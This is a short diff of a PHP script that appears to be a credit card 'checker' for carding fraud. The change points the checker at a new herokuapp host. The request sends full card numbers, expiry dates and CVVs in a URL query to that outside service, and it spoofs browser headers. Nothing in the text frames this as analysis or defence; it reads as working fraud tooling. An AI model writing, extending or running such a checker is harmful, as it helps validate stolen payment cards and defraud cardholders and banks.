@@ -425,14 +425,14 @@ if(strpos($fim, '"type":"credit"') !== false) {
 curl_close($ch);
 /////////////////////////////============BIN LOOKUP END===============/////////////////////////////////
 $ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, 'http://check-cc.herokuapp.com/api.php?lista='.$cc.'|'.$mon.'|'.$year.'|'.$cvv.'');
+curl_setopt($ch, CURLOPT_URL, 'http://checker-cc.herokuapp.com/api.php?lista='.$cc.'|'.$mon.'|'.$year.'|'.$cvv.'');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'Accept: */*',
 'Accept-Language: en-US,en;q=0.9',
-'Host: check-cc.herokuapp.com',
-'Referer: http://check-cc.herokuapp.com/checkerbysaharsh.html',
+'Host: checker-cc.herokuapp.com',
+'Referer: http://checker-cc.herokuapp.com/checkerbysaharsh.html',
 'Sec-Fetch-Dest: empty',
 'Sec-Fetch-Mode: cors',
 'Sec-Fetch-Site: same-origin',
